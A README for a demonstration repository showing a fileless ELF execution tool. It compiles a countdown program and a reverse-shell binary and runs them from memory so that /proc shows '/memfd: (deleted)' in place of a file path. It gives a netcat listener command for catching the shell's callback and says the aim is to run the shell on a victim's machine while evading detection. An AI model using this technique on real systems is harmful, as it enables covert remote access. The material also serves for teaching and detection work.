# fee_demo
- Demonstration of tool `fileless-elf-exec` (https://github.com/nnsee/fileless-elf-exec)
- Code for shell taken from https://gist.github.com/magisterquis/ce8b99b42188f4517efb3e1038a483de
- [Video demo](https://youtu.be/hi2bJ6eiw8o)

### Usage
- Tutorial for usage on fedora Linux, if you are using different distribution, install corresponding packages defined in `install.sh` for your distribution
- Install golang and fee: `bash install.sh`
- Compile countdown code: `bash compile_odb.sh`
- Compile shell code: `bash compile_shell.sh`
- Start countdown executable "normaly": `./odbrojavanje/odbrojavanje`
- Start countdown executable with `fee`: `python fee_odb.py`
- Start shell executable "normaly": `./shell/demoshell`
- Start shell executable with `fee`: `python fee_shell.py`
- The scripts for compilation (`compile_shell.sh` and `compile_odb.sh`) are configured for amd64 arhitecture, if you are using different arhitecture try removing (or changing to your arhitecture) `--target` flag in 5th line
  
### Shell demo
- After starting the program, in the second terminal execute the following command: `rlwrap -S "$(printf '\033[95mds>\033[m ')" nc -nvlp 4444`
- You should enter the interactive shell in which you can execute any command
- The point of the attack is to execute demoshell on victim's computer and configure it to send a callback to attacker's computer
- In this scenario, victim and attacker are on the same host for simplicity
- When executed with `fee` (i.e. without using reading source file from disk) it is harder to trace and detect the malware (in this case demoshell)
### Difference
- After starting the program, exeute `ps aux | grep <program_name>` where `<program_name>` is either `'demoshell'` or `'odbrojavanje'` and find PID of the process
- Execute `ls -l /proc/<PID>/exe`
- If you executed program "normally" you should be able to see link to your executable file, while if you executed fee script, you should see something like `'/memfd: (deleted)'`, i.e. you won't be able to see link to the executable 
